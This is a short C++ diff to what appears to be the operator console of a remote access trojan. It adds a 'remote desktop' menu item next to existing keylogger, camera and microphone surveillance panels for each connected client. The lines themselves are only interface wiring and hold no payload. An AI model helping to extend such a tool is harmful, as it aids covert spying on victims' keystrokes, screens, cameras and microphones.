@@ -1,4 +1,5 @@
 #include "frame_client.hpp"
+#include "frame_remote_desktop.hpp"
 #include "panel_file_manager.hpp"
 #include "panel_process_manager.hpp"
 #include "panel_keylogger.hpp"
@@ -64,6 +65,8 @@ FrameCliente::FrameCliente(std::string strID, SOCKET sckID, std::string strIP)
     this->m_tree->AppendItem(rootSurveilance, wxT("Keylogger"));
     this->m_tree->AppendItem(rootSurveilance, wxT("Camara"));
     this->m_tree->AppendItem(rootSurveilance, wxT("Microfono"));
+    this->m_tree->AppendItem(rootSurveilance, wxT("Escritorio Remoto"));
+
     
     /*this->m_tree->AppendItem(rootMisc, wxT("Testing"));*/
     
@@ -153,6 +156,9 @@ void MyTreeCtrl::OnItemActivated(wxTreeEvent& event) {
             this->p_Notebook->AddPage(new panelMicrophone(this), wStr, true);
         } else if (wStr == "Camara") {
             this->p_Notebook->AddPage(new panelCamara(this), wStr, true);
+        }else if (wStr == "Escritorio Remoto") {
+            frameRemoteDesktop* frm_temp = DBG_NEW frameRemoteDesktop(this);
+            frm_temp->Show(true);
         }
 
         this->p_Notebook->Thaw();
